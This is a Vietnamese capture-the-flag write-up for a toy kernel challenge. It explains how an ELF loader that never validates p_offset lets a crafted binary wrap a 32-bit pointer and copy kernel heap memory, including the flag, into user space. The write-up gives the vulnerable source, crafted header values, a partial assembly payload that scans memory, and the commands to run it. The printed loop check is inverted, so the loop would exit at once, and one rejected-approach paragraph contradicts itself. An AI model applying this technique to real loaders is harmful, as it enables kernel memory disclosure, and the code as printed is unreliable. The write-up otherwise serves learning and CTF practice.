# soupOS 3: Bad Recipe - Rev Eng pwn (498 điểm)

**Cờ:** `cdctf{bad_recipe_the_loader_reads_wide}` · **Điểm:** 498 · **Tác giả:** soup (CDCTF)
**Handout:** `soupos-handout.tar.gz` + `symbols.txt` (dùng chung cả chain)

## Đề bài

"Một chuỗi nằm đâu đó trong kernel memory và không bao giờ được ghi ra đĩa. Dựng một binary thuyết phục
loader trao nó cho bạn." Không có upload: `/unhex.elf` biến text hex thành byte thô, `jot` để gõ, làm việc
trong `/prep`, và `cook` phải dùng đường dẫn tuyệt đối.

## Phân tích ban đầu

Cờ được `kmalloc` rồi ghim trên heap, không bao giờ ghi đĩa:

```c
g_stage3 = (char *)kmalloc(64);
strcpy(g_stage3, FLAG3);
klog("[chal] stage3 flag pinned at %p\n", (void *)g_stage3);
```

`[chal] stage3 flag pinned at 0x17600c` in ra lúc boot, và `symbols.txt` có `00176000 b heap_arena` —
đó là một mảng `.bss` 8 MB, tức cờ nằm trong vùng nhân đã được map. `paging_init` map identity toàn bộ
127 MB nên **đọc** vùng đó không sinh page fault; vấn đề chỉ là làm sao đưa kernel copy cho ta.

Mắt xích nằm trong `usermode.c`:

```c
static int load_segment(const uint8_t *buf, uint32_t bufsz, const elf32_phdr_t *ph) {
    ...
    if (va_end <= va_start) return -1;                       /* wrapped */
    if (ph->p_vaddr < USER_LO) return -1;
    if (va_end > USER_HI)      return -1;
#ifdef NO_CHALLENGE
    if (ph->p_offset > bufsz) return -1;
    if (ph->p_filesz > bufsz - ph->p_offset) return -1;
#else
    /* CHALLENGE=1: p_offset is deliberately NOT validated. */
    (void)bufsz;
#endif
    ...
    memcpy((void *)ph->p_vaddr, buf + ph->p_offset, ph->p_filesz);
```

Loader kiểm tra **đích** (`p_vaddr`, `p_memsz`, có chống tràn) nhưng không kiểm tra **nguồn**
(`p_offset`) — bản `NO_CHALLENGE` có kiểm, bản thi đấu thì không. `buf` là vùng `kmalloc(MAX_ELF)` với
`MAX_ELF = 256 * 1024`, và `buf + p_offset` là số học con trỏ 32 bit, nên chọn `p_offset` đủ lớn sẽ
**quay vòng** xuống dưới cả heap.

## Các hướng đã loại

1. **Đọc cờ bằng soupyc (`read(open("/FLAG3..."))`)** — cờ không nằm trên đĩa, stage 3 cố tình không có
   file.
2. **Đặt `p_vaddr` trỏ thẳng vào `0x17600c` để memcpy ghi đè kernel** — `p_vaddr` bị chặn
   `USER_LO..USER_HI` (`0xC0000000..0xC8000000`), và `map_user_page` cho địa chỉ kernel đã map sẽ trả
   "đã có" rồi memcpy ghi thẳng vào nhân; chính comment trong source nói đây là thứ đã được chặn.
3. **`p_offset` dương lớn hơn `bufsz`** (không wrap): `buf + p_offset` rơi vào heap phía trên buffer, vẫn
   đọc được nhưng trượt cờ vì cờ nằm *dưới* `buf`? Không — cờ ở `0x17600c` còn buffer ở cao hơn nhiều;
   thử trực tiếp thì window dương không phủ tới `heap_arena`, window `-1 MB` mới phủ. Đã kiểm bằng cách
   chạy cả hai scenario trong harness (xem Bước 1).
4. **Upload binary**: không có kênh upload, mọi thứ phải gõ dưới dạng hex qua `jot` + `/unhex.elf`.

## Chuỗi khai thác

**Bước 1 - Dựng ELF và chứng minh bằng harness trước khi gõ.** `analysis/build_elf.py` build đúng ELF 174
byte, **replay nguyên văn vị từ của `load_segment`** và chạy một micro-VM i386 để xem payload làm gì, kèm
ba scenario kiểm chứng:

```text
  buf=0xfff00000 WRAP -1MB   pages=512 flag_image_off=0x10000c (in window) hits=1 [b'cdctf{...}']
  buf=0x00000000 NO WRAP (negative control)                       hits=0
  buf=0xfff00000 WRAP, flag absent (negative control)             hits=0
ALL SCENARIOS OK
```

Nghĩa là: window phải **quay vòng xuống dưới buffer** (buộc 1) và nếu không có cờ trong vùng đó thì
payload phải in ra 0 dòng (buộc 2) — hai control để không biến một lỗi lập trình thành "đã leak".

**Bước 2 - Tính toán window.** `p_offset = 0xFFF00000` ⇒ `read_from = (buf + 0xFFF00000) & 0xFFFFFFFF`
tức `buf − 1 MB`. `p_filesz = p_memsz = 0x200000` (2 MB) nên ảnh chương trình trải từ `buf − 1 MB` tới
`buf + 1 MB`, đặt tại `p_vaddr = 0xC0000000`:

| trường | giá trị | ý nghĩa |
|---|---|---|
| `e_entry` | `0xC0100054` | code của ta nằm ở offset 84 trong file, mà file bắt đầu ở `0xC0100000` trong ảnh |
| `p_offset` | `0xFFF00000` | `buf − 1 MB` (32-bit wrap) |
| `p_vaddr` | `0xC0000000` | trong `USER_LO..USER_HI` |
| `p_filesz = p_memsz` | `0x200000` | cửa sổ 2 MB: 1 MB kernel phía dưới + 1 MB phía trên |
| `p_flags` | `7` | RWX |

Với ba địa chỉ `buf` được kiểm tra bằng harness, vùng quét chứa `heap_arena = 0x176000`. Cần xác nhận vị trí buffer khi tái hiện trên môi trường khác; ba phép thử không bảo đảm mọi layout đều tương tự.

**Bước 3 - Payload 90 byte (ring 3, chỉ dùng `int 0x80`).** Duyệt 1 MB dưới ảnh, tìm dword `0x74636463`
("cdct"), in 48 byte tại mỗi điểm chạm rồi in một `\n`:

```nasm
mov dword [0xc0180000], 10      ; byte '\n' để sẵn, syscall write sau lấy từ đây
xor esi, esi
.loop:
cmp esi, 0x100000
jbe .done                        ; chỉ quét 1 MB dưới
mov eax, [esi+0xc0000000]
cmp eax, 0x74636463              ; "cdct"
...
mov edx, 48
mov ebx, 1
mov eax, 1                       ; sys_write(1, ptr, 48)
int 0x80
add esi, 4
jmp .loop
.done:
xor eax, eax
xor ebx, ebx
int 0x80                         ; sys_exit(0)
```

Lưu ý khi quét: ngay cả **so sánh cũng là dữ liệu** — nếu quét toàn bộ 2 MB thì chính lệnh `cmp eax,0x74636463`
của payload chứa chuỗi "cdct" và tự bắt được nó. Giới hạn vòng quét vào 1 MB dưới buffer là để loại tự chạm.

**Bước 4 - Đưa lên máy không có upload.** `jot /prep/LEAK.HEX` mở editor, gõ 11 dòng hex (mỗi dòng 32 ký
tự, `files/leak.hex.txt`), `Ctrl+S` rồi `Esc`; `/unhex.elf` đọc hex và ghi byte thô — **số byte in ra chính
là phép kiểm tra toàn vẹn** (kích thước dự kiến là 174 byte; đủ số byte chưa bảo đảm mọi ký tự hex đều đúng):

```text
cook@soupOS:/> cook /unhex.elf /prep/LEAK.HEX /prep/LEAK.ELF
unhex: wrote 174 bytes
cook@soupOS:/> cook /prep/LEAK.ELF
cdctf{bad_recipe_the_loader_reads_wide}
cdctf{mise_en_place_two_paths_one_check}
```

Dòng thứ hai là FLAG1 của stage 1: nó nằm trong `.rodata` nên cũng lọt cửa sổ quét — bằng chứng độc lập
rằng primitive đọc đúng là "kernel memory", không phải đọc file.

## Cờ

```text
cdctf{bad_recipe_the_loader_reads_wide}
```

## Reproduce

```bash
# local: dựng ELF + chạy 3 scenario (1 dương, 2 âm)
python3 analysis/build_elf.py            # ghi leak.elf và leak.hex.txt

# trên máy: jot -> gõ 11 dòng hex -> cook /unhex.elf -> cook /prep/LEAK.ELF
cook /unhex.elf /prep/LEAK.HEX /prep/LEAK.ELF   # phải in "unhex: wrote 174 bytes"
cook /prep/LEAK.ELF
```
